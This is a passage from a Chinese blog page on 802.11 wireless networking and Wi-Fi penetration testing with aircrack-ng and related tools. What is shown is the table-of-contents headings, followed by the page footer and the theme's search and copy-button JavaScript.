class="nav-link" href="#Sequence-Control（序列控制域）"><span class="nav-number">1.7.2.3.</span> <span class="nav-text">Sequence Control（序列控制域）</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#802-11-MAC数据段"><span class="nav-number">1.7.3.</span> <span class="nav-text">802.11 MAC数据段</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Frame-Body"><span class="nav-number">1.7.3.1.</span> <span class="nav-text">Frame Body</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#802-11-MAC校验"><span class="nav-number">1.7.4.</span> <span class="nav-text">802.11 MAC校验</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#FCS（32位）"><span class="nav-number">1.7.4.1.</span> <span class="nav-text">FCS（32位）</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CONTROL-FRAME-控制帧"><span class="nav-number">1.8.</span> <span class="nav-text">CONTROL FRAME(控制帧)</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#ACK帧"><span class="nav-number">1.8.1.</span> <span class="nav-text">ACK帧</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#PS-POLL帧"><span class="nav-number">1.8.2.</span> <span class="nav-text">PS-POLL帧</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#STATION省电模式唤醒"><span class="nav-number">1.8.2.1.</span> <span class="nav-text">STATION省电模式唤醒</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#RTS-CTS帧"><span class="nav-number">1.8.3.</span> <span class="nav-text">RTS/CTS帧</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#传输过程"><span class="nav-number">1.8.3.0.1.</span> <span class="nav-text">传输过程</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#MANAGEMENT-FRAME-管理帧"><span class="nav-number">1.9.</span> <span class="nav-text">MANAGEMENT FRAME(管理帧)</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#BEACON-FRAMES帧"><span class="nav-number">1.9.1.</span> <span class="nav-text">BEACON FRAMES帧</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#PROBE-REQUEST-FRAMES帧"><span class="nav-number">1.9.2.</span> <span class="nav-text">PROBE REQUEST FRAMES帧</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#AUTHENTICATION-FRAMES帧"><span class="nav-number">1.9.3.</span> <span class="nav-text">AUTHENTICATION FRAMES帧</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Authentication-Algorithm"><span class="nav-number">1.9.3.1.</span> <span class="nav-text">Authentication Algorithm</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Authentication-Seq"><span class="nav-number">1.9.3.2.</span> <span class="nav-text">Authentication Seq</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Challenge-text"><span class="nav-number">1.9.3.3.</span> <span class="nav-text">Challenge text</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Status-Code"><span class="nav-number">1.9.3.4.</span> <span class="nav-text">Status Code</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ASSOCIATION-REASSOCIATION-FRAMES帧"><span class="nav-number">1.9.4.</span> <span class="nav-text">ASSOCIATION/REASSOCIATION FRAMES帧</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Association-Request帧"><span class="nav-number">1.9.4.1.</span> <span class="nav-text">Association Request帧</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Reassociation-Request帧"><span class="nav-number">1.9.4.2.</span> <span class="nav-text">Reassociation Request帧</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Association-Response帧"><span class="nav-number">1.9.4.3.</span> <span class="nav-text">Association Response帧</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#DISASSOCIATION-DEAUTHENTICATION帧"><span class="nav-number">1.9.5.</span> <span class="nav-text">DISASSOCIATION/DEAUTHENTICATION帧</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ATIM-FRAMES帧"><span class="nav-number">1.9.6.</span> <span class="nav-text">ATIM FRAMES帧</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#DATA-FRAME-数据帧"><span class="nav-number">1.10.</span> <span class="nav-text">DATA FRAME(数据帧)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#无线通信过程"><span class="nav-number">1.11.</span> <span class="nav-text">无线通信过程</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Probe-探测"><span class="nav-number">1.11.1.</span> <span class="nav-text">Probe(探测)</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#WEP探测过程"><span class="nav-number">1.11.1.0.1.</span> <span class="nav-text">WEP探测过程</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#WPA探测过程"><span class="nav-number">1.11.1.0.2.</span> <span class="nav-text">WPA探测过程</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Authentication-认证"><span class="nav-number">1.11.2.</span> <span class="nav-text">Authentication(认证)</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#WEP-OPEN认证过程"><span class="nav-number">1.11.2.0.1.</span> <span class="nav-text">WEP OPEN认证过程</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#WEP-PSK-共享密钥-认证过程"><span class="nav-number">1.11.2.0.2.</span> <span class="nav-text">WEP PSK(共享密钥)认证过程</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Association-关联"><span class="nav-number">1.11.3.</span> <span class="nav-text">Association(关联)</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#加密"><span class="nav-number">1.12.</span> <span class="nav-text">加密</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#OPEN-无加密网络"><span class="nav-number">1.12.1.</span> <span class="nav-text">OPEN 无加密网络</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#WEP加密系统"><span class="nav-number">1.12.2.</span> <span class="nav-text">WEP加密系统</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#RC4算法"><span class="nav-number">1.12.2.1.</span> <span class="nav-text">RC4算法</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#WPA安全系统"><span class="nav-number">1.12.3.</span> <span class="nav-text">WPA安全系统</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#WPA1"><span class="nav-number">1.12.3.1.</span> <span class="nav-text">WPA1</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#WPA2"><span class="nav-number">1.12.3.2.</span> <span class="nav-text">WPA2</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#WPA企业连接过程"><span class="nav-number">1.12.3.3.</span> <span class="nav-text">WPA企业连接过程</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#WPA个人连接过程"><span class="nav-number">1.12.3.4.</span> <span class="nav-text">WPA个人连接过程</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#协商安全协议过程"><span class="nav-number">1.12.3.5.</span> <span class="nav-text">协商安全协议过程</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#身份认证过程-WPA企业"><span class="nav-number">1.12.3.6.</span> <span class="nav-text">身份认证过程(WPA企业)</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#密钥交换"><span class="nav-number">1.12.3.7.</span> <span class="nav-text">密钥交换</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#PMK"><span class="nav-number">1.12.3.7.1.</span> <span class="nav-text">PMK</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#WPA企业"><span class="nav-number">1.12.3.7.1.1.</span> <span class="nav-text">WPA企业</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#WPA个人"><span class="nav-number">1.12.3.7.1.2.</span> <span class="nav-text">WPA个人</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#PTK的生成过程"><span class="nav-number">1.12.3.7.2.</span> <span class="nav-text">PTK的生成过程</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#四步握手生成PTK"><span class="nav-number">1.12.3.7.3.</span> <span class="nav-text">四步握手生成PTK</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#数据加密，完整性校验"><span class="nav-number">1.12.3.8.</span> <span class="nav-text">数据加密，完整性校验</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#无线渗透实操"><span class="nav-number">1.13.</span> <span class="nav-text">无线渗透实操</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#AIRCRACK-NG基础"><span class="nav-number">1.13.1.</span> <span class="nav-text">AIRCRACK-NG基础</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#airmon-ng启动侦听"><span class="nav-number">1.13.1.1.</span> <span class="nav-text">airmon-ng启动侦听</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#airodump-ng无线抓包"><span class="nav-number">1.13.1.2.</span> <span class="nav-text">airodump-ng无线抓包</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#airodump-ng排错"><span class="nav-number">1.13.1.2.1.</span> <span class="nav-text">airodump-ng排错</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#不显示任何AP和STATION信息"><span class="nav-number">1.13.1.2.1.1.</span> <span class="nav-text">不显示任何AP和STATION信息</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#工作一段时间后airodump-ng无法继续抓包"><span class="nav-number">1.13.1.2.1.2.</span> <span class="nav-text">工作一段时间后airodump-ng无法继续抓包</span></a></li></ol></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#aireplay-ng注入包"><span class="nav-number">1.13.1.3.</span> <span class="nav-text">aireplay-ng注入包</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#基本测试"><span class="nav-number">1.13.1.3.1.</span> <span class="nav-text">基本测试</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#向隐藏AP-指定SSID注入包测试"><span class="nav-number">1.13.1.3.2.</span> <span class="nav-text">向隐藏AP/指定SSID注入包测试</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#card-to-card-注入测试"><span class="nav-number">1.13.1.3.3.</span> <span class="nav-text">card to card 注入测试</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#MAC地址绑定攻击"><span class="nav-number">1.14.</span> <span class="nav-text">MAC地址绑定攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#设置AP"><span class="nav-number">1.14.1.</span> <span class="nav-text">设置AP</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#配置用于侦听的一台kali"><span class="nav-number">1.14.2.</span> <span class="nav-text">配置用于侦听的一台kali</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#配置用于攻击的另一台kali"><span class="nav-number">1.14.3.</span> <span class="nav-text">配置用于攻击的另一台kali</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#WEP攻击"><span class="nav-number">1.15.</span> <span class="nav-text">WEP攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#WEP密码破解原理"><span class="nav-number">1.15.1.</span> <span class="nav-text">WEP密码破解原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#WEP共享密钥破解"><span class="nav-number">1.15.2.</span> <span class="nav-text">WEP共享密钥破解</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#攻击过程"><span class="nav-number">1.15.3.</span> <span class="nav-text">攻击过程</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#WPA攻击"><span class="nav-number">1.16.</span> <span class="nav-text">WPA攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#WPA-PSK攻击"><span class="nav-number">1.16.1.</span> <span class="nav-text">WPA PSK攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#PSK破解过程"><span class="nav-number">1.16.1.1.</span> <span class="nav-text">PSK破解过程</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#无AP时WPA密码破解"><span class="nav-number">1.16.1.2.</span> <span class="nav-text">无AP时WPA密码破解</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#提高WPA攻击效率工具"><span class="nav-number">1.16.2.</span> <span class="nav-text">提高WPA攻击效率工具</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#AIROLIB破解密码"><span class="nav-number">1.16.2.1.</span> <span class="nav-text">AIROLIB破解密码</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#JTR破解密码"><span class="nav-number">1.16.2.2.</span> <span class="nav-text">JTR破解密码</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#COWPATTY破解密码"><span class="nav-number">1.16.2.3.</span> <span class="nav-text">COWPATTY破解密码</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#PYRIT破解密码"><span class="nav-number">1.16.2.4.</span> <span class="nav-text">PYRIT破解密码</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#使用pyrit抓取WPA四步握手"><span class="nav-number">1.16.2.4.0.1.</span> <span class="nav-text">使用pyrit抓取WPA四步握手</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#分析pyrit所抓取的四步握手数据包"><span class="nav-number">1.16.2.4.0.2.</span> <span class="nav-text">分析pyrit所抓取的四步握手数据包</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#使用airodump抓取的数据包，导入pyrit并筛选"><span class="nav-number">1.16.2.4.0.3.</span> <span class="nav-text">使用airodump抓取的数据包，导入pyrit并筛选</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#使用密码字典直接破解"><span class="nav-number">1.16.2.4.0.4.</span> <span class="nav-text">使用密码字典直接破解</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#数据库模式破解"><span class="nav-number">1.16.2.4.0.5.</span> <span class="nav-text">数据库模式破解</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#WPS攻击"><span class="nav-number">1.17.</span> <span class="nav-text">WPS攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#攻击过程-1"><span class="nav-number">1.17.1.</span> <span class="nav-text">攻击过程</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#综合自动化无线密码破解工具wifite"><span class="nav-number">1.18.</span> <span class="nav-text">综合自动化无线密码破解工具wifite</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#EVIL-TWIN-AP-ROGUE-AP"><span class="nav-number">1.19.</span> <span class="nav-text">EVIL TWIN AP/ROGUE AP</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#3vilTwinAttacker"><span class="nav-number">1.19.1.</span> <span class="nav-text">3vilTwinAttacker</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#WPA企业攻击"><span class="nav-number">1.20.</span> <span class="nav-text">WPA企业攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#hostapd-wpe"><span class="nav-number">1.20.1.</span> <span class="nav-text">hostapd-wpe</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#aircrack-ng-suite其他工具"><span class="nav-number">1.21.</span> <span class="nav-text">aircrack-ng suite其他工具</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#airdecap-ng"><span class="nav-number">1.21.1.</span> <span class="nav-text">airdecap-ng</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#airserv-ng"><span class="nav-number">1.21.2.</span> <span class="nav-text">airserv-ng</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#airtun-ng"><span class="nav-number">1.21.3.</span> <span class="nav-text">airtun-ng</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#wIDS"><span class="nav-number">1.21.3.1.</span> <span class="nav-text">wIDS</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#WEP"><span class="nav-number">1.21.3.1.1.</span> <span class="nav-text">WEP</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#WPA"><span class="nav-number">1.21.3.1.2.</span> <span class="nav-text">WPA</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Repeate"><span class="nav-number">1.21.3.2.</span> <span class="nav-text">Repeate</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Replay"><span class="nav-number">1.21.3.3.</span> <span class="nav-text">Replay</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#其他工具"><span class="nav-number">1.22.</span> <span class="nav-text">其他工具</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#bessid-ng"><span class="nav-number">1.22.1.</span> <span class="nav-text">bessid-ng</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Fern-WIFI-Cracker"><span class="nav-number">1.22.2.</span> <span class="nav-text">Fern WIFI Cracker</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#无线侦察"><span class="nav-number">1.23.</span> <span class="nav-text">无线侦察</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#kismet"><span class="nav-number">1.23.1.</span> <span class="nav-text">kismet</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#GPS模块"><span class="nav-number">1.23.2.</span> <span class="nav-text">GPS模块</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Google地球"><span class="nav-number">1.23.3.</span> <span class="nav-text">Google地球</span></a></li></ol></li></ol></li></ol></div>
            

          </div>
        </section>
      <!--/noindex-->
      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2024</span>
  <span class="with-love" id="animate">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">LoongEyes</span>

  

  
</div>





<div class="theme-info">
  <div class="powered-by"></div>
  <span class="post-count">博客全站共172.5k字</span>
</div>


<!--
<div style="width:400px;margin:0 auto; padding:20px 0;">
	<div style="display:inline-block;text-decoration:none;height:20px;line-height:20px;"><img src="/images/beiantubiao.png" alt="备案标识"/></div>
	<a target="_blank" href="http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=37010302000766" style="display:inline-block;text-decoration:none;height:20px;line-height:20px;"><img src="" style="float:left;"/><p style="float:left;height:20px;line-height:20px;margin: 0px 0px 0px 5px; color:#939393;">鲁公网安备 37010302000766号</p></a>
	<div style="display:inline-block;text-decoration:none;height:20px;line-height:20px;"><a target="_blank" href="http://beian.miit.gov.cn/" style="display:inline-block;text-decoration:none;height:20px;line-height:20px;"><p style="float:left;height:20px;line-height:20px;margin: 0px 0px 0px 5px; color:#939393;">鲁ICP备19025353号</p></a></div>
</div>
-->

        








        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
          <span id="scrollpercent"><span>0</span>%</span>
        
      </div>
    

    
	
    

    
  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>












  















  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=6.3.0"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=6.3.0"></script>



  
  


  <script type="text/javascript" src="/js/src/affix.js?v=6.3.0"></script>

  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=6.3.0"></script>



  
  <script type="text/javascript" src="/js/src/scrollspy.js?v=6.3.0"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=6.3.0"></script>



  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=6.3.0"></script>



  



  










  

  <script type="text/javascript">
    // Popup Window;
    var isfetched = false;
    var isXml = true;
    // Search DB path;
    var search_path = "search.xml";
    if (search_path.length === 0) {
      search_path = "search.xml";
    } else if (/json$/i.test(search_path)) {
      isXml = false;
    }
    var path = "/" + search_path;
    // monitor main search box;

    var onPopupClose = function (e) {
      $('.popup').hide();
      $('#local-search-input').val('');
      $('.search-result-list').remove();
      $('#no-result').remove();
      $(".local-search-pop-overlay").remove();
      $('body').css('overflow', '');
    }

    function proceedsearch() {
      $("body")
        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
        .css('overflow', 'hidden');
      $('.search-popup-overlay').click(onPopupClose);
      $('.popup').toggle();
      var $localSearchInput = $('#local-search-input');
      $localSearchInput.attr("autocapitalize", "none");
      $localSearchInput.attr("autocorrect", "off");
      $localSearchInput.focus();
    }

    // search function;
    var searchFunc = function(path, search_id, content_id) {
      'use strict';

      // start loading animation
      $("body")
        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
          '<div id="search-loading-icon">' +
          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
          '</div>' +
          '</div>')
        .css('overflow', 'hidden');
      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');

      

      $.ajax({
        url: path,
        dataType: isXml ? "xml" : "json",
        async: true,
        success: function(res) {
          // get the contents from search data
          isfetched = true;
          $('.popup').detach().appendTo('.header-inner');
          var datas = isXml ? $("entry", res).map(function() {
            return {
              title: $("title", this).text(),
              content: $("content",this).text(),
              url: $("url" , this).text()
            };
          }).get() : res;
          var input = document.getElementById(search_id);
          var resultContent = document.getElementById(content_id);
          var inputEventFunction = function() {
            var searchText = input.value.trim().toLowerCase();
            var keywords = searchText.split(/[\s\-]+/);
            if (keywords.length > 1) {
              keywords.push(searchText);
            }
            var resultItems = [];
            if (searchText.length > 0) {
              // perform local searching
              datas.forEach(function(data) {
                var isMatch = false;
                var hitCount = 0;
                var searchTextCount = 0;
                var title = data.title.trim();
                var titleInLowerCase = title.toLowerCase();
                var content = data.content.trim().replace(/<[^>]+>/g,"");
                
                var contentInLowerCase = content.toLowerCase();
                var articleUrl = decodeURIComponent(data.url);
                var indexOfTitle = [];
                var indexOfContent = [];
                // only match articles with not empty titles
                if(title != '') {
                  keywords.forEach(function(keyword) {
                    function getIndexByWord(word, text, caseSensitive) {
                      var wordLen = word.length;
                      if (wordLen === 0) {
                        return [];
                      }
                      var startPosition = 0, position = [], index = [];
                      if (!caseSensitive) {
                        text = text.toLowerCase();
                        word = word.toLowerCase();
                      }
                      while ((position = text.indexOf(word, startPosition)) > -1) {
                        index.push({position: position, word: word});
                        startPosition = position + wordLen;
                      }
                      return index;
                    }

                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
                  });
                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
                    isMatch = true;
                    hitCount = indexOfTitle.length + indexOfContent.length;
                  }
                }

                // show search results

                if (isMatch) {
                  // sort index by position of keyword

                  [indexOfTitle, indexOfContent].forEach(function (index) {
                    index.sort(function (itemLeft, itemRight) {
                      if (itemRight.position !== itemLeft.position) {
                        return itemRight.position - itemLeft.position;
                      } else {
                        return itemLeft.word.length - itemRight.word.length;
                      }
                    });
                  });

                  // merge hits into slices

                  function mergeIntoSlice(text, start, end, index) {
                    var item = index[index.length - 1];
                    var position = item.position;
                    var word = item.word;
                    var hits = [];
                    var searchTextCountInSlice = 0;
                    while (position + word.length <= end && index.length != 0) {
                      if (word === searchText) {
                        searchTextCountInSlice++;
                      }
                      hits.push({position: position, length: word.length});
                      var wordEnd = position + word.length;

                      // move to next position of hit

                      index.pop();
                      while (index.length != 0) {
                        item = index[index.length - 1];
                        position = item.position;
                        word = item.word;
                        if (wordEnd > position) {
                          index.pop();
                        } else {
                          break;
                        }
                      }
                    }
                    searchTextCount += searchTextCountInSlice;
                    return {
                      hits: hits,
                      start: start,
                      end: end,
                      searchTextCount: searchTextCountInSlice
                    };
                  }

                  var slicesOfTitle = [];
                  if (indexOfTitle.length != 0) {
                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
                  }

                  var slicesOfContent = [];
                  while (indexOfContent.length != 0) {
                    var item = indexOfContent[indexOfContent.length - 1];
                    var position = item.position;
                    var word = item.word;
                    // cut out 100 characters
                    var start = position - 20;
                    var end = position + 80;
                    if(start < 0){
                      start = 0;
                    }
                    if (end < position + word.length) {
                      end = position + word.length;
                    }
                    if(end > content.length){
                      end = content.length;
                    }
                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
                  }

                  // sort slices in content by search text's count and hits' count

                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
                      return sliceRight.hits.length - sliceLeft.hits.length;
                    } else {
                      return sliceLeft.start - sliceRight.start;
                    }
                  });

                  // select top N slices in content

                  var upperBound = parseInt('1');
                  if (upperBound >= 0) {
                    slicesOfContent = slicesOfContent.slice(0, upperBound);
                  }

                  // highlight title and content

                  function highlightKeyword(text, slice) {
                    var result = '';
                    var prevEnd = slice.start;
                    slice.hits.forEach(function (hit) {
                      result += text.substring(prevEnd, hit.position);
                      var end = hit.position + hit.length;
                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
                      prevEnd = end;
                    });
                    result += text.substring(prevEnd, slice.end);
                    return result;
                  }

                  var resultItem = '';

                  if (slicesOfTitle.length != 0) {
                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
                  } else {
                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
                  }

                  slicesOfContent.forEach(function (slice) {
                    resultItem += "<a href='" + articleUrl + "'>" +
                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
                      "...</p>" + "</a>";
                  });

                  resultItem += "</li>";
                  resultItems.push({
                    item: resultItem,
                    searchTextCount: searchTextCount,
                    hitCount: hitCount,
                    id: resultItems.length
                  });
                }
              })
            };
            if (keywords.length === 1 && keywords[0] === "") {
              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
            } else if (resultItems.length === 0) {
              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
            } else {
              resultItems.sort(function (resultLeft, resultRight) {
                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
                  return resultRight.searchTextCount - resultLeft.searchTextCount;
                } else if (resultLeft.hitCount !== resultRight.hitCount) {
                  return resultRight.hitCount - resultLeft.hitCount;
                } else {
                  return resultRight.id - resultLeft.id;
                }
              });
              var searchResultList = '<ul class=\"search-result-list\">';
              resultItems.forEach(function (result) {
                searchResultList += result.item;
              })
              searchResultList += "</ul>";
              resultContent.innerHTML = searchResultList;
            }
          }

          if ('auto' === 'auto') {
            input.addEventListener('input', inputEventFunction);
          } else {
            $('.search-icon').click(inputEventFunction);
            input.addEventListener('keypress', function (event) {
              if (event.keyCode === 13) {
                inputEventFunction();
              }
            });
          }

          // remove loading animation
          $(".local-search-pop-overlay").remove();
          $('body').css('overflow', '');

          proceedsearch();
        }
      });
    }

    // handle and trigger popup window;
    $('.popup-trigger').click(function(e) {
      e.stopPropagation();
      if (isfetched === false) {
        searchFunc(path, 'local-search-input', 'local-search-result');
      } else {
        proceedsearch();
      };
    });

    $('.popup-btn-close').click(onPopupClose);
    $('.popup').click(function(e){
      e.stopPropagation();
    });
    $(document).on('keyup', function (event) {
      var shouldDismissSearchPopup = event.which === 27 &&
        $('.search-popup').is(':visible');
      if (shouldDismissSearchPopup) {
        onPopupClose();
      }
    });
  </script>





  

  

  

  

  
  

  

  

  

  

  
  <style>
    .copy-btn {
      display: inline-block;
      padding: 6px 12px;
      font-size: 13px;
      font-weight: 700;
      line-height: 20px;
      color: #333;
      white-space: nowrap;
      vertical-align: middle;
      cursor: pointer;
      background-color: #eee;
      background-image: linear-gradient(#fcfcfc, #eee);
      border: 1px solid #d5d5d5;
      border-radius: 3px;
      user-select: none;
      outline: 0;
    }

    .highlight-wrap .copy-btn {
      transition: opacity .3s ease-in-out;
      opacity: 0;
      padding: 2px 6px;
      position: absolute;
      right: 4px;
      top: 8px;
    }

    .highlight-wrap:hover .copy-btn,
    .highlight-wrap .copy-btn:focus {
      opacity: 1
    }

    .highlight-wrap {
      position: relative;
    }
  </style>
  <script>
    $('.highlight').each(function (i, e) {
      var $wrap = $('<div>').addClass('highlight-wrap')
      $(e).after($wrap)
      $wrap.append($('<button>').addClass('copy-btn').append('复制').on('click', function (e) {
        var code = $(this).parent().find('.code').find('.line').map(function (i, e) {
          return $(e).text()
        }).toArray().join('\n')
        var ta = document.createElement('textarea')
        document.body.appendChild(ta)
